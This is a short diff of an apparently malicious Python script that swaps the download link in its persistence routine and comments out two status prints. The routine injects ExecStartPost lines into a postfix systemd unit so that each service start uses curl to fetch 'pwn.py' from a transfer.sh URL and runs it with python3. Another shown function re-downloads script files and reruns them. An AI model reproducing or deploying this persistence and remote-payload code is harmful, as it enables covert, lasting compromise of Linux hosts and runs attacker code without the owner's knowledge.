@@ -123,7 +123,7 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/7BQ8Tz/pwn.py\n".format(locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/eErsUQ/pwn.py\n".format(locationFile)
     ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
     
     try:
@@ -222,7 +222,7 @@ def getScript():
             save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
             open(locationDir + file, "wb").write(save.content)
 
-        print("redownloaded script from github")
+        #print("redownloaded script from github")
         rerun(True)
     else:
         exit()
@@ -251,7 +251,7 @@ def main():
 
     startUpRecovery()
     
-    print("!!!updated version")
+    #print("not version")
 
 
 
